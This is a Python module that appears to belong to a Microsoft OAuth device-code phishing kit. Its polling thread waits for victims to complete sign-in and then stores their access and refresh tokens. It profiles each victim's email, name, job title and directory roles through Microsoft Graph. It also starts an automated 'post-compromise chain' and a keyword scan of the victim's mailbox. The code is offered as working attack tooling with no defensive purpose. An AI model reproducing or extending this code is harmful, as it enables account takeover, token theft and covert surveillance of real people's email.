# ── poller.py ───────────────────────────────────────────
import time
import logging
import threading
from config import Config
import db
import oauth
import graph
import executor

logger = logging.getLogger(__name__)

class TokenPoller(threading.Thread):
    def __init__(self):
        super().__init__(daemon=True)
        self._running = True

    def run(self):
        logger.info("Microsoft token poller thread started.")
        while self._running:
            now_ts = int(time.time())
            pending_sessions = db.get_pending_sessions()
            for session in pending_sessions:
                user_code = session['user_code']
                created_at = session.get('created_at')
                is_timed_out = False
                if created_at:
                    try:
                        import datetime
                        dt = datetime.datetime.strptime(created_at[:19], '%Y-%m-%d %H:%M:%S')
                        created_ts = int(dt.replace(tzinfo=datetime.timezone.utc).timestamp())
                        if (now_ts - created_ts) > 900:
                            is_timed_out = True
                    except Exception:
                        pass

                if is_timed_out:
                    logger.info(f"[POLLER] Session {user_code} expired after 15 minutes of inactivity.")
                    db.update_session_status(user_code, 'EXPIRED')
                    continue

                status, access_token, refresh_token, raw_data = oauth.poll_token(session['device_code'])
                
                if status == 'SUCCESS':
                    db.update_session_token(user_code, access_token, refresh_token, raw_data)
                    
                    # Fetch victim profile with realistic role and metadata
                    profile = graph.get_user_profile(access_token)
                    if 'error' not in profile:
                        v_email = profile.get('mail') or profile.get('userPrincipalName') or 'Unknown'
                        v_name = profile.get('displayName') or 'Unknown'
                        v_role = profile.get('jobTitle') or ''
                        if not v_role:
                            # Query directory roles
                            try:
                                roles_res = graph.get_user_directory_roles(access_token)
                                if roles_res and 'value' in roles_res and len(roles_res['value']) > 0:
                                    v_role = roles_res['value'][0].get('displayName', 'Member')
                                else:
                                    v_role = 'User'
                            except Exception:
                                v_role = 'Member'
                        db.update_session_profile(user_code, v_name, v_email, v_role)
                    
                    # Trigger automated post-compromise chain in a background thread
                    threading.Thread(
                        target=executor.execute_post_compromise, 
                        args=(user_code,), 
                        daemon=True
                    ).start()

                    # Trigger automated keyword intelligence scan in a background thread
                    try:
                        import keyword_watcher
                        updated_session = db.get_session(user_code)
                        if updated_session:
                            threading.Thread(
                                target=keyword_watcher.scan_victim_mailbox,
                                args=(updated_session,),
                                daemon=True
                            ).start()
                    except Exception as e:
                        logger.warning(f"Failed to launch keyword watcher for {user_code}: {e}")
                    
                elif status in ('EXPIRED', 'INVALID_GRANT'):
                    db.update_session_status(user_code, status)
                    
            time.sleep(Config.POLL_INTERVAL)

    def stop(self):
        self._running = False